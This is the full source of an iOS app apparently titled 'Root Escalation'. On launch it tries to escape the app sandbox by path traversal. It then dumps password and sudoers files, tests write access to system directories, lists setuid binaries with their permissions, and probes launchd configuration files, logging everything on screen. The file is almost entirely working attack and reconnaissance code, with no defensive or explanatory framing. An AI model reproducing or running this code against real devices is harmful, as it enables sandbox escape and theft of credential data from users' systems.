#import <UIKit/UIKit.h>

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@property (strong, nonatomic) UITextView *logView;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    
    UIViewController *vc = [[UIViewController alloc] init];
    self.logView = [[UITextView alloc] initWithFrame:self.window.bounds];
    self.logView.editable = NO;
    self.logView.text = @"Root Escalation\n\n";
    vc.view = self.logView;
    
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        [self escalate];
    });
    
    return YES;
}

- (void)log:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingString:[msg stringByAppendingString:@"\n"]];
    });
}

- (NSString *)traverse:(NSString *)path {
    NSString *home = NSHomeDirectory();
    NSString *traversal = [@"../../../../../../" stringByAppendingString:path];
    return [home stringByAppendingPathComponent:traversal];
}

- (void)escalate {
    [self log:@"[1] Reading sensitive files...\n"];
    
    NSFileManager *fm = [NSFileManager defaultManager];
    
    // 1. Read password files
    NSArray *sensitiveFiles = @[
        @"/etc/passwd",
        @"/etc/master.passwd",
        @"/etc/group",
        @"/etc/sudoers",
        @"/private/etc/passwd",
        @"/private/etc/master.passwd",
    ];
    
    for (NSString *file in sensitiveFiles) {
        NSString *path = [self traverse:file];
        NSData *data = [fm contentsAtPath:path];
        if (data) {
            NSString *content = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
            NSString *msg = [NSString stringWithFormat:@"*** %@ (%lu bytes):\n%@\n", file, (unsigned long)data.length, content];
            [self log:msg];
        } else {
            NSString *msg = [NSString stringWithFormat:@"[-] %@ not accessible", file];
            [self log:msg];
        }
        usleep(50000);
    }
    
    [self log:@"\n[2] Checking write access...\n"];
    
    // 2. Test write access to temp directories
    NSArray *writeTests = @[
        @"/tmp/test_write",
        @"/var/tmp/test_write",
        @"/private/tmp/test_write",
        @"/var/mobile/test_write",
    ];
    
    for (NSString *testPath in writeTests) {
        NSString *path = [self traverse:testPath];
        NSString *testContent = @"test123";
        NSError *error = nil;
        BOOL success = [testContent writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:&error];
        if (success) {
            NSString *msg = [NSString stringWithFormat:@"*** WRITE SUCCESS: %@", testPath];
            [self log:msg];
            // Clean up
            [fm removeItemAtPath:path error:nil];
        } else {
            NSString *msg = [NSString stringWithFormat:@"[-] WRITE FAILED: %@ - %@", testPath, error.localizedDescription];
            [self log:msg];
        }
        usleep(50000);
    }
    
    [self log:@"\n[3] Looking for setuid binaries...\n"];
    
    // 3. Find setuid binaries
    NSArray *suidPaths = @[
        @"/usr/bin/passwd",
        @"/usr/bin/sudo",
        @"/bin/su",
        @"/usr/bin/chsh",
        @"/usr/bin/chfn",
        @"/usr/bin/newgrp",
        @"/usr/sbin/traceroute",
        @"/usr/sbin/ping",
    ];
    
    for (NSString *suid in suidPaths) {
        NSString *path = [self traverse:suid];
        BOOL exists = [fm fileExistsAtPath:path];
        if (exists) {
            NSDictionary *attrs = [fm attributesOfItemAtPath:path error:nil];
            if (attrs) {
                NSNumber *owner = attrs[NSFileOwnerAccountID];
                NSNumber *perms = attrs[NSFilePosixPermissions];
                NSString *msg = [NSString stringWithFormat:@"*** %@ owner=%@ perms=%@", suid, owner, perms];
                [self log:msg];
            }
        }
        usleep(50000);
    }
    
    [self log:@"\n[4] Checking launchd configs...\n"];
    
    // 4. Read launchd configs
    NSArray *launchdPaths = @[
        @"/Library/LaunchDaemons/com.apple.springboard.plist",
        @"/Library/LaunchDaemons/com.apple.backboardd.plist",
        @"/System/Library/LaunchDaemons/com.apple.launchd.plist",
        @"/private/var/db/launchd.db/com.apple.launchd/overrides.plist",
    ];
    
    for (NSString *launchd in launchdPaths) {
        NSString *path = [self traverse:launchd];
        NSData *data = [fm contentsAtPath:path];
        if (data) {
            NSString *msg = [NSString stringWithFormat:@"*** %@ (%lu bytes)", launchd, (unsigned long)data.length];
            [self log:msg];
        }
        usleep(50000);
    }
    
    [self log:@"\n[5] Done"];
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
